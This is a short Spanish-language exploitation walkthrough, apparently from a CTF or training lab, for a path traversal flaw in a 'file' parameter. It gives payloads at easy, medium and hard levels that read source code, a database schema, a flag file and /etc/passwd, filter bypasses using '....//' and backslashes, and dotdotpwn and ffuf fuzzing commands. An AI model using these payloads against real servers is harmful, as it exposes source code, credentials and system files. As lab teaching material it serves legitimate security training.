Pasos de explotación

  1. El parámetro file se concatena con la ruta base static/files/ sin validación.
  2. Easy: Usa ../ directamente: 
    /files?file=../../app.py                  # código fuente
/files?file=../../database/schema.sql    # esquema BD
/files?file=../../secret/flag.txt        # flag XXE
  3. Medium: Filtra ../ con un solo reemplazo. Bypass con doble traversal: 
    # ....// → al eliminar ../ interno queda ../
/files?file=....//....//app.py
/files?file=....//....//database/schema.sql

# Backslash (funciona en Windows)
/files?file=..\..\app.py
  4. Hard: Filtra ../ y ..\ recursivamente. Usa herramientas automatizadas: 
    # dotdotpwn prueba múltiples técnicas de encoding
dotdotpwn -m http -h TARGET_IP -x 5000 -f /etc/passwd \
  -u "http://TARGET_IP/files?file=TRAVERSAL" -k "root:"

# ffuf con wordlists LFI de SecLists
ffuf -u "http://TARGET_IP/files?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 -fs 0
  5. Con Burp Suite: intercepta el GET y modifica el parámetro file manualmente.

Herramientas

curl ffuf wfuzz Burp Suite dotdotpwn
